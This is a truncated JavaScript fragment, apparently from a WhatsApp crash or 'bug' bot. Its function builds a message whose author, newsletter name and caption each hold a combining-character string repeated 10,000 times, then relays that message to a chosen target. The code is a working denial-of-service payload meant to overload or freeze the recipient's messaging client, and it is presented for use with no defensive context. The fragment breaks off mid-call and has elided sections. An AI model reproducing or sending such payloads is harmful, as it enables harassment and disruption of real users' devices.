async function VerloadXDelayBlank(target, mention) {
  try {
    const mentionedList = [
    ...
    const embeddedMusic = {
        ...
        author: "VaxzyOfficial." + "ោ៝".repeat(10000),
        title: "Overload👀",
    ...
    newsletterAdminInviteMessage: {
      newsletterJid: "120363321780343299@newsletter",
      newsletterName: "VaxzyModeHigh 🔥" + "ោ៝".repeat(10000),
      caption: "VaxzyModeHigh 🔥" + "ោ៝".repeat(10000),
      inviteExpiration: "999999999"
    }
  };

  await sock.relayMessage(target, messageXBlank, {
